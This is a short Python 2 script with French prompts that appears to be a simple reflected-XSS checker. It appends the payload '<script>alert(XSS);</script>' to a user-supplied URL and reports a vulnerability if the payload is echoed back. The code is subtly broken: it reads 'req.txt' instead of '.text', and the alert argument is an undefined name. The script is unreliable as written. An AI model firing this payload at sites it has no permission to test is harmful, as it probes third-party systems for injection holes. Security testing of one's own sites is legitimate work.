import requests

target = raw_input("Entrer votre URL..")

payload = "<script>alert(XSS);</script>"

req = requests.get(target + payload)

if payload in req.txt:
	print "Vunérabilité détecté"
	print "Attaque payload"+payload
else:
	print "Secure"
